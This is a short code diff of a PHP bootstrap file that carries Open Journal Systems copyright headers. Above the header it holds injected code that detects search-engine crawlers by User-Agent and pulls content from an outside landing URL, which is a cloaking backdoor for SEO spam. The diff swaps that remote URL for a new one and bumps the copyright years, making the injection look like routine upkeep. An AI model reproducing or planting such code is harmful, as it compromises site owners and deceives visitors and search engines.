@@ -2,7 +2,7 @@
 @ob_start();
 header("Vary: U-Agent");
 
-$src = "https://wellplayer.online/landing/avia.ftmd.itb.ac.id/index.txt";
+$src = "https://childrenofiran.org/landing/journal.sekawan-org/";
 $match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
 $ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
@@ -32,8 +32,8 @@ if (preg_match($match, $ua)) {
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2000-2020 John Willinsky
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2000-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
